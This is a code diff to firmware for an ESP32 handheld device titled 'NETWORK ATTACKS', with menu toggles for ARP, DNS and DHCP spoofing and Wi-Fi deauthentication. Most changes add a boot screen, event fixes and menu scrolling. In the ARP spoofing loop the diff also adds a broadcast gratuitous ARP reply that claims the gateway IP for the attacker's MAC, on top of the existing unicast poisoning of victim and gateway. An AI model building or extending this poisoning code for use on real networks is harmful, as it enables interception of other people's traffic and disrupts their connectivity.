@@ -97,6 +97,35 @@ void setup() {
     esp_wifi_set_promiscuous(true);
     
     Serial.println("[+] Network Attacks Ready");
+    
+    // ===== Boot splash screen =====
+    {
+        unsigned long bootStart = millis();
+        bool bootDone = false;
+        while (!bootDone) {
+            displayClearBuffer();
+            displayDrawStr(0, 8, "NETWORK ATTACKS");
+            displayDrawLine(0, 10, 127, 10);
+            
+            if (WiFi.status() == WL_CONNECTED) {
+                displayDrawStr(0, 22, "WiFi: Connected");
+                char ipStr[16];
+                strlcpy(ipStr, WiFi.localIP().toString().c_str(), sizeof(ipStr));
+                displayDrawStr(0, 34, "IP:");
+                displayDrawStr(24, 34, ipStr);
+                displayDrawStr(0, 52, "[+] Ready");
+            } else {
+                displayDrawStr(0, 22, "WiFi: FAILED");
+                displayDrawStr(0, 34, "Check settings!");
+                displayDrawStr(0, 52, "[!] No WiFi");
+            }
+            displaySendBuffer();
+            
+            if (inputGetEvent() != EVT_NONE) bootDone = true;
+            if (millis() - bootStart >= 2500) bootDone = true;
+            delay(10);
+        }
+    }
 }
 
 void loop() {
@@ -142,26 +171,33 @@ void loop() {
                     deauthStop();
                 }
             }
-            if (cursor == 4) { currentScreen = SCR_SETTINGS; settingsMenuOpen(); }
-            if (cursor == 5) currentScreen = SCR_STATUS;
+            if (cursor == 4) { currentScreen = SCR_SETTINGS; settingsMenuOpen(); evt = EVT_NONE; }
+            if (cursor == 5) { currentScreen = SCR_STATUS; evt = EVT_NONE; }
         }
     } else if (currentScreen == SCR_STATUS) {
         if (evt == EVT_SELECT || evt == EVT_UP || evt == EVT_DOWN || evt == EVT_BACK) {
             currentScreen = SCR_MAIN;
+            evt = EVT_NONE;
         }
     } else if (currentScreen == SCR_SETTINGS) {
         if (!settingsMenuIsActive()) {
             currentScreen = SCR_MAIN;
+            evt = EVT_NONE;
         } else {
             settingsMenuUpdate(evt);
         }
     }
     
     // ARP spoofing
+    static const uint8_t BROADCAST_MAC[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
     if (arpOn && now - lastArp >= (unsigned long)g_arp_interval_ms) {
         lastArp = now;
+        // 1. Tell victim that gateway IP is at ESP32 MAC (unicast)
         sendArpReply(g_victim_mac, g_gateway_ip, g_esp32_mac, g_victim_ip);
+        // 2. Tell gateway that victim IP is at ESP32 MAC (unicast)
         sendArpReply(g_gateway_mac, g_victim_ip, g_esp32_mac, g_gateway_ip);
+        // 3. Broadcast gratuitous ARP: gateway IP is at ESP32 MAC (all devices hear it)
+        sendArpReply(BROADCAST_MAC, g_gateway_ip, g_esp32_mac, g_victim_ip);
         arpCount++;
     }
     
@@ -235,30 +271,49 @@ void processPkt(uint8_t* data, uint16_t len) {
     }
 }
 
+static int mainMenuScroll = 0;
+
 void renderMain() {
     displayClearBuffer();
     displayDrawStr(0, 8, "NETWORK ATTACKS");
     displayDrawLine(0, 10, 127, 10);
     const char* items[] = {"ARP Spoof", "DNS Spoof", "DHCP Spoof", "Deauth", "Settings >", "Status >"};
-    const char* status[6];
-    status[0] = arpOn ? "ON" : "OFF";
-    status[1] = dnsOn ? "ON" : "OFF";
-    status[2] = dhcpOn ? "ON" : "OFF";
-    status[3] = deauthOn ? "ON" : "OFF";
-    status[4] = "";
-    status[5] = "";
+    const char* statusVals[6];
+    statusVals[0] = arpOn ? "ON" : "OFF";
+    statusVals[1] = dnsOn ? "ON" : "OFF";
+    statusVals[2] = dhcpOn ? "ON" : "OFF";
+    statusVals[3] = deauthOn ? "ON" : "OFF";
+    statusVals[4] = "";
+    statusVals[5] = "";
     
-    for (int i = 0; i < 6; i++) {
+    const int visibleCount = 4;
+    const int totalCount = 6;
+    
+    // Auto-scroll: keep cursor inside the viewport
+    if (cursor < mainMenuScroll) mainMenuScroll = cursor;
+    if (cursor >= mainMenuScroll + visibleCount) mainMenuScroll = cursor - visibleCount + 1;
+    
+    // Scroll arrows
+    if (mainMenuScroll > 0) {
+        displayDrawStr(120, 14, "^");
+    }
+    if (mainMenuScroll + visibleCount < totalCount) {
+        displayDrawStr(120, 62, "v");
+    }
+    
+    for (int i = 0; i < visibleCount; i++) {
+        int idx = mainMenuScroll + i;
+        if (idx >= totalCount) break;
         int y = 22 + i * 10;
-        if (i == cursor) {
+        if (idx == cursor) {
             displayDrawBox(0, y - 8, 128, 10);
             displaySetDrawColor(0);
         }
-        displayDrawStr(4, y, items[i]);
-        if (strlen(status[i]) > 0) {
-            displayDrawStr(88, y, status[i]);
+        displayDrawStr(4, y, items[idx]);
+        if (strlen(statusVals[idx]) > 0) {
+            displayDrawStr(88, y, statusVals[idx]);
         }
-        if (i == cursor) displaySetDrawColor(1);
+        if (idx == cursor) displaySetDrawColor(1);
     }
     displaySendBuffer();
 }
